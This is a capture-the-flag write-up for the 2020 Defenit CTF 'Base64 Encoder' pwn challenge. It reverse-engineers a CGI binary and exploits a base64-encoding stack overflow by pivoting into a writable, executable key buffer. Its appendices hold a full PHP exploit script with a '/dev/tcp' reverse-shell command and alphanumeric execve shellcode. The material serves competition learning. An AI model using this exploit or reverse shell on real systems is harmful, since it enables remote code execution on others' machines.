# Base64 Encoder - 2020 Defenit CTF (pwn, 656p, 9 solved)
## Introduction

Base64 Encoder is a pwn task.

Only a link to a [web service](http://base64-encoder.ctf.defenit.kr/) is
provided. No binary is given.

This web service provides a way to encode and decode a text and a key to and
from `base64+`.

The `robots.txt` file mentions `/cgi-src/`. This directory contains a `chall`
binary that is executed by the `/cgi-bin/chall` endpoint.

The binary is a 32-bits CGI ELF. It reads input (the body of the HTTP request)
and outputs HTTP headers (`Content-type: application/json`) and the response's
body.

Apache acts as the middleman, calling the binary, feeding it data from the
request. It then reads the response and formats it for the user.

## Reverse engineering

The binary is statically linked and stripped. Knowledge of the C standard
functions and the glibc's assert messages are helpful to identify `malloc`,
`mmap`, and `calloc` in `main`.

The binary first starts by allocating 12 bytes. It uses this buffer to store 3
pointers allocated with `malloc` and `mmap`. The call to `mmap` creates a memory
mapping at a fixed location that is writable and executable.

This structure contains the 3 variables sent to the binary : `cmd`, `buf` and
`key`. The body is parsed by the function `parseBody` at `0x08048a50`.

```c
#define PROT_RWX PROT_READ | PROT_WRITE | PROT_EXEC

struct request {
	char *cmd;
	char *buffer;
	char *key;
};

struct request r = malloc(sizeof(r));

r->cmd    = malloc(0x10);
r->buffer = malloc(0x100);
r->key    = mmap(0x77777000, 0x1000, PROT_RWX, MMAP_FIXED | MMAP_ANON, 0, 0);

parseBody(&r, body);
```

`cmd` can be either `encode` or `decode`.

`buffer` can contain anything but NULL bytes.

`key` must be base64. The mapping is empty if it contains any invalid base64
character. It is truncated to the first `=`.

The fact that `key`'s mapping is writable and executable, and that it is mapped
at a fixed address that can be represented as `wwp` hints that it is expected to
use `key` as a shellcode at some point.

The function `handleRequest` at `0x08048bf0` takes the `request` structure,
and calls either `encode` at `0x08048cc0` or `decode` at `0x08048c72`.

These functions respectively encode and decode base64. It uses the key to
transform the alphabet. It is not required to understand exactly how the
alphabet is modified as the binary can be used as an oracle to encode/decode
a buffer with a specific key.


## Exploitation

When encoding in base64, the output needs 4/3 times more bytes than the input
(it outputs 4 bytes for 3 bytes encoded). This looks like a good candidate for a
buffer overflow ; and it is : encoding a very large buffer results in a
segmentation fault.

```
(gdb) r < <(printf 'cmd=encode&key=a&buf=%04096d')
Starting program: /mnt/ctf/2020/2020-06-05-Defenit/pwn/base64/chall < <(printf 'cmd=encode&key=a&buf=%04096d')
Content-type: application/json

{"cmd": "encode", "output": "MDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMA=="}

Program received signal SIGSEGV, Segmentation fault.
0x08048373 in ?? ()
=> 0x08048373:	c3	ret

(gdb) x/wz $sp
0x77414449:	Cannot access memory at address 0x77414449

% xxd -r -ps <<< 77414449
wADI
```

`encode` smashes the stack by only a few bytes.

The call stack looks like this :

```
main
`-> handleRequest
    `-> encode
```

`encode` overwrites saved registers of the previous functions :

```
(gdb) x/5i $pc
=> 0x8048c93:	pop    ebx
   0x8048c94:	pop    esi
   0x8048c95:	pop    edi
   0x8048c96:	pop    ebp
   0x8048c97:	ret

(gdb) x/5wz $sp
0xffffcb6c:	0x7741444d	0x7741444d	0x3d3d414d	0xffffcb00
0xffffcb7c:	0x0804835f

(gdb) x/s $sp
0xffffcb6c:	"MDAwMDAwMA=="
```

`ebx`, `esi` are totally controlled. `esi` contains two `=` (padding character).
`ebp` has its last byte set to `NULL`.

This shifts `main`'s esp by a few bytes, right into the base64 buffer.

```
(gdb) x/9i $pc
=> 0x8048366:	lea    esp,[ebp-0x10]
   0x8048369:	xor    eax,eax
   0x804836b:	pop    ecx
   0x804836c:	pop    ebx
   0x804836d:	pop    esi
   0x804836e:	pop    edi
   0x804836f:	pop    ebp
   0x8048370:	lea    esp,[ecx-0x4]
   0x8048373:	ret

(gdb) x/5wz $ebp - 0x10
0xffffcaf0:	0x7741444d	0x7741444d	0x7741444d	0x7741444d
0xffffcb00:	0x7741444d

(gdb) x/s $ebp - 0x10
0xffffcaf0:	"MDAwMDAwMDAwMDAwMDAwMA=="
```

The `ecx`, `ebx`, `esi`, `edi` and `ebp` registers can thus be controlled. `esp`
is `ecx - 4`. This is why the segmentation fault occurs with `esp == "MDAw" - 4`

The attack plan is:
1. write shellcode in base64
2. use oracle to decode a valid base64 address
3. call encode with shellcode in `key` and the address sprayed in `buf`
4. off-by-one will turn load the address as stack pointer
5. set return address in key

```
(gdb) x/i $pc
=> 0x8048373:	ret

(gdb) x/wz $sp
0x7777702c:	0x77777030

(gdb) x/4i 0x77777030
   0x77777030:	push   0x2f526558
   0x77777035:	pop    eax
   0x77777036:	xor    eax,0x2f526558
   0x7777703b:	push   eax
```

The binary only reads `0x1000` bytes from stdin, but Apache will write
anything sent by the client, even if it is longer than the `0x1000` bytes.

This behaviour can be used to interact with the binary once the shellcode is
executed by sending the payload padded to `0x1000` bytes, followed by a command.

**Flag**: `Defenit{dGhpc19pc19yZWFsbHlfc3RyYW5nZV9lbmNvZGVyLHJpZ2h0Pzpw}`

## Appendices

### pwn.php

```php
#!/usr/bin/php
<?php
const ENDPOINT = "http://base64-encoder.ctf.defenit.kr/cgi-bin/chall";

function send($type, $key, $buffer)
{
	static $curl;

	if(!$curl) {
		$curl = curl_init(ENDPOINT);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
	}

	$data = sprintf("cmd=%s&key=%s&buf=%s", $type, $key, $buffer);
	curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

	$response = curl_exec($curl);
	$response = substr($response, 29, -3);
	return $response;
}

function encode($key, $buffer)
{
	return send("encode", $key, $buffer);
}

function decode($key, $buffer)
{
	return send("decode", $key, $buffer);
}

// rwx @ 0x77777000
$key  = str_pad("T+F+N+S/X+e+R", 0x20, "/");
$key .= pack("V", 0x41414141);   // 0x77777020
$key .= pack("V", 0x41414141);   // 0x77777024
$key .= pack("V", 0x41414141);   // 0x77777028
$key .= pack("V", 0x77777030);   // 0x7777702c: pc
$key .= file_get_contents("sc"); // 0x77777030

$buffer = pack("V", 0x77777030);
$clear  = decode($key, $buffer);
assert(3 === strlen($clear));
//fprintf(STDERR, "Recode: %s\n", encode($key, $clear));
fprintf(STDERR, "clear = %s\n", bin2hex($clear));

$buffer  = str_repeat($clear, (249 + 12) / 2);
$buffer  = str_pad($buffer, 0x1000, "\n"); // ensure the buffer is filled

$buffer .= "bash -c 'bash</dev/tcp/$host/$port'\n";
$buffer .= str_repeat("\n", 0x1000);
encode($key, $buffer);
```

### sc.S

```assembler
.intel_syntax noprefix

.global _start
_start:
	// eax = 0
	push 0x2f526558
	pop  eax
	xor  eax, 0x2f526558

	// ecx = 0
	push eax
	pop  ecx

	// edx = -1
	push eax
	pop  edx
	dec  edx

xor_cd:
	// eax = syscall
	xor eax, (0x77777030 + syscall - _start)
	xor byte ptr [eax], dh

xor_80:
	// can't inc eax >_>
	push ecx
	pop  eax
	xor  eax, (0x77777030 + syscall - _start + 1)
	xor  byte ptr [eax], dh

	push 0x48484848
	pop  edx
	xor  byte ptr [eax], dh

stack:
	// stack
	push ecx
	// [null]

	push 0x68732F2F // //sh
	//push 0x64692F2F // //id
	push 0x6e69622f // /bin
	push esp
	pop  edx

	// push : eax, ecx, edx, ebx, [skip], ebp, esi, edi
	push 0x41414141
	pop  eax
	xor  eax, 0x41414141 ^ 0x0B
	push eax

	// stack: execve /bin/sh NULL

	push ecx // ecx = 0
	push ecx // edx = 0
	push edx // ebx = "/bin/sh"
	push ecx // skipped
	push ecx // ebp = 0
	push ecx // esi = 0
	push ecx // edi = 0

	popa

syscall:
	.byte '2' // 0xCD ^ 0xFF
	.byte '7' // 0x80 ^ 0xFF ^ 0x48
```